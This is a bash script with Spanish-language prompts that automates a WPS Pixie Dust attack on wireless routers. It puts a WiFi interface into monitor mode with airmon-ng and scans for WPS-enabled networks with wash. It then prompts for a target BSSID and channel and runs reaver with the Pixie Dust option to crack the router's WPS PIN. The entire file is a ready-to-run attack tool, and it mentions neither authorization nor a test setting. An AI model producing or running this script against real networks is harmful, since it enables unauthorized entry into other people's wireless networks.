#!/bin/bash
# WPS Pixie Dust Attack

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

clear
echo -e "${RED}"
cat << "EOF"
╔══════════════════════════════════════════════════════════════╗
║                WPS PIXIE DUST ATTACK                         ║
╚══════════════════════════════════════════════════════════════╝
EOF
echo -e "${NC}"

echo -e "${CYAN}Descripción:${NC}"
echo "  • Explota vulnerabilidad WPS"
echo "  • ${GREEN}NO requiere wordlist${NC}"
echo "  • Solo funciona si WPS está habilitado"
echo "  • ~50% routers vulnerables"
echo ""

if ! command -v reaver &>/dev/null; then
    echo -e "${RED}[!] reaver no instalado${NC}"
    echo -e "${YELLOW}[*] Ejecuta: sudo ./install.sh${NC}"
    exit 1
fi

# Detectar interfaz
echo -e "${CYAN}[*] Interfaces WiFi:${NC}"
airmon-ng
echo ""
read -p "Interfaz: " interface

# Modo monitor
echo -e "${YELLOW}[*] Modo monitor...${NC}"
airmon-ng check kill &>/dev/null
airmon-ng start $interface &>/dev/null
monitor="${interface}mon"
echo -e "${GREEN}[✓] $monitor${NC}"
echo ""

# Escanear WPS
echo -e "${CYAN}[*] Escaneando redes con WPS (30 segundos)...${NC}"
echo ""

timeout 30 wash -i $monitor

# Objetivo
echo ""
read -p "BSSID del objetivo con WPS: " bssid
read -p "Canal: " canal

if [ -z "$bssid" ]; then
    echo -e "${RED}[!] BSSID no especificado${NC}"
    airmon-ng stop $monitor &>/dev/null
    exit 1
fi

# Ataque Pixie Dust
echo ""
echo -e "${CYAN}[*] Iniciando ataque Pixie Dust...${NC}"
echo -e "${YELLOW}[*] Esto puede tomar 5-30 minutos${NC}"
echo ""

reaver -i $monitor -b $bssid -c $canal -K -vv

# Restaurar
airmon-ng stop $monitor &>/dev/null

echo ""
read -p "Presiona Enter para continuar..."
